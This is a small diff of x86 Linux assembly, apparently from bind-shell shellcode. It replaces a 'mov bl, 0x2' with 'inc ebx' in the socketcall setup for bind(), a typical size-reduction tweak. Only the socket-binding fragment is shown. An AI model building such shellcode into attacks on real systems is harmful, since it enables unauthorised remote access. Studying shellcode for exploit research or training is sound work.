@@ -41,7 +41,7 @@ push word 0x2		  ; AF_INET=2, TCP protocol 2
 mov ecx, esp		  ; save the pointer to arguments in ecx
 
 mov al, 0x66		  ; sys socket call
-mov bl, 0x2		    ; bind(2)
+inc ebx   		    ; bind(2)
 push 0x10		      ; push size of sock_ad (the address length, 8+8 sin_zero member) to the stack
 push ecx		      ; struct pointer
 push esi		      ; push previously saved socket file descriptor onto stack
